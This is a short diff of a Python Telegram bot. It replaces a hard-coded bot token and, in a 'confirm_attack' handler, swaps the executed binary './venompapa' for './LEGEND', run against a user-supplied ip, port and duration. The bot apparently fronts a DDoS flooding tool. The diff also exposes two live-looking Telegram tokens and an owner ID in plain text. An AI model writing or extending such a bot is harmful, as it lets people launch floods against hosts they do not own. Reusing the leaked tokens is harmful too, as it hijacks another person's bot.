@@ -7,7 +7,7 @@ import html
 from telebot import types
 
 # Using your provided Telegram bot token and owner ID
-TELEGRAM_TOKEN = '7873604969:AAF1SImkDX0a4KzFsQwIafVKLPfN3zaP2zk'
+TELEGRAM_TOKEN = '7713586067:AAE7VVm-lQBUqWpguAY7BrkfO5Oj7aVSApM'
 OWNER_ID = '1604629264'
 
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
@@ -174,7 +174,7 @@ def confirm_attack(call):
             time.sleep(1)
         
         # Step 4: Execute the Binary Command
-        command = f"./venompapa {ip} {port} {duration}"
+        command = f"./LEGEND {ip} {port} {duration}"
         try:
             result = subprocess.run(shlex.split(command), check=True, capture_output=True, text=True)
             output = html.escape(result.stdout)
